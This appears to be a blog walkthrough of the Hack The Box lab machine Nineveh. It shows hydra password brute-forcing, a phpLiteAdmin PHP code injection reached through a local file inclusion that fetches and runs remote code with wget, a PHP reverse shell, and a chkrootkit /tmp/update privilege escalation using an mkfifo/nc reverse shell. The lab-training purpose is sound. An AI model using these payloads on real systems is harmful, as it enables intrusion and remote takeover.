---
layout: post
title: "HTB-Nineveh"
categories: HTB-Walkthrough
---

![nineveh](/assets/img/nineveh.png)


Nineveh is an interesting box from HTB, and very much an OSCP-like box.

Nmap first...

`nmap -sV -Pn --min-rate 10000 -sC |tee -a nin.txt`

```

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

```


It seems to be good practice to add found domain names to our /etc/hosts file; it can often reveal
pages that, without it, do not appear. So before we start enumerating the two web ports...

`nano /etc/hosts` , type in the ip address...then press tab, and enter the domain name...like this:

```

10.10.10.43	nineveh.htb

```

You can add more domain names if you find them, to the same line; just have a space between them.

First we'll try port 80...

It looks like we'll need to brute-force directories to move forwards...

```

gobuster dir -u http://10.10.10.43/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php,.txt,.sh

```

gobuster finds `/department` which is a web login page, and in the source we find two possible usernames: `admin` and `amrois`.

We can use a hydra dictionary attack with these to get valid creds.

make user.txt containing the found names...
trying a few of the usual suspects manually, I work out that the page reveals valid/invalid usernames.
admin is valid
amrois is invalid

so I wont be needing user.txt after all...
I've chosen to use the rockyou.txt password file, 



```

hydra 10.10.10.43 -l admin -P /root/wordlists/rockyou.txt http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!" -V


```

I love it when it works...what a tool!

```

[80][http-post-form] host: 10.10.10.43   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-08-20 00:22:07

```

After logging in we find that this too is under construction, but there is a link to notes.txt

```

Have you fixed the login page yet! hardcoded username and password is really bad idea!

check your serect folder to get in! figure it out! this is your challenge

Improve the db interface.
~amrois


```

So we need to find a secret folder? which may relate to a database interface?

Trying /secret fails, but /db comes up trumps with a phpadminlite 1.9 login page.

We just need a password for this, hydra again is the best idea.

We can use 'whatever' as username ...hydra knows this is a dummy id.

```

hydra 10.10.10.43 -l whatever -P /usr/share/wordlists/rockyou.txt https-post-form "/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."

```
Yay!!!

```

[443][http-post-form] host: 10.10.10.43   login: whatever   password: password123

```

Should have probably tried some manually first, since that is one everyone tries...no matter!

`searchsploit phpliteadmin 1.9`

```

-------------------------------------------------- ----------------------------------------
 Exploit Title                                    |  Path
                                                  | (/usr/share/exploitdb/)
-------------------------------------------------- ----------------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection    | exploits/php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities     | exploits/php/webapps/39714.txt
-------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

Checking out these files we find a method to use.


create boo.php database
create table : newtable  1 field
create field : somefiled  TEXT 
default value: <?php system("wget http://10.10.14.19/evil.txt -O /tmp/evil.php;php /tmp/evil.php"); ?>



make evil.txt file containing....

`<?php $sock=fsockopen("10.10.14.19",6969);exec("/bin/sh -i <&3 >&3 2>&3");?>`


start a webserver and nc listener....
`python3 -m http.server 80`


`nc -nlvp 6969`


execute the lfi with....(it takes quite some experimentation to get this from the initial lfi address..)

initial lfi indicator
`http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd`


~~~~~
eventual working exploit lfi...

`http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../var/tmp/boo.php`

###################################

<h3>Privesc to root...</h3>

There appears to be report folder in amrois home/folder  ran by root via chkrootkit
 it calls `/tmp/update`


research chrootkit local priv esc.....

all we have to do (because it checks for updates..)
...is exploit the fact it looks in /tmp folder for 'update'


... so we make file `/tmp/update` containing nc reverse shell (old nc)

A favourite trick of writing files on targets,that I've picked up, is using cat. 
It's handy when text editors are unavailable or problematic to use...but I've come to use it frequently; 
initially because I wanted to remember it, but I continue to do so because I think its a neat trick.

```

cat >update<<_EOF
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 1337 >/tmp/f
_EOF

```

`chmod +x update` to make it executable.

Send a copy to /tmp `cp update /tmp/`

...set listener to 1337

######################

```

root@kali:~/HTB/retired/nineveh# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.10.43] 44776
/bin/sh: 0: can't access tty; job control turned off
whoami
root                                                                                                               
id                                                                                                               
uid=0(root) gid=0(root) groups=0(root)                                                                             
cat /root/root.txt                                                                                               
8axxxxxxxxxxxxxxxxxxxxxxxxxxxx3a                                                                                   
ls /home                                                                                                         
amrois                                                                                                             
cat /home/amrois/user.txt                                                                                        
82xxxxxxxxxxxxxxxxxxxxxxxxxxxxc8      

```
:)





